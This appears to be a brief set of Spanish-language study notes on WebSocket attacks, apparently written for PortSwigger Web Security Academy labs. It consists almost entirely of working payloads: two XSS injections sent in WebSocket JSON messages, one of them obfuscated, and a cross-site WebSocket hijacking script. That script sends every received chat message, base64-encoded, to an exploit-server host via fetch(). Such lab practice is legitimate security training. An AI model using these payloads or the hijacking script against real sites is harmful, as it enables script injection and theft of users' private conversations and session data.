# Web Sockets
1. Manipulando para hacer un XSS
```
{"message":"<img src=1 onerror='alert(1)'>"}
```
2. Ofucación
```
{"message":"<img src=1 oNeRrOr=alert`1`>"}
``` 
3. CSRF
```
<script>
var wsocket = new WebSocket("wss://0a96004604b5af78863adac600aa002a.web-security-academy.net/chat");

wsocket.onopen = function() {
    wsocket.send("READY");
};

wsocket.onmessage = function(event) {
    fetch("https://exploit-0a3400710446af96867ed9ac0132009d.exploit-server.net/exploit?noseassapo=" + btoa(event.data));
};
</script>
```
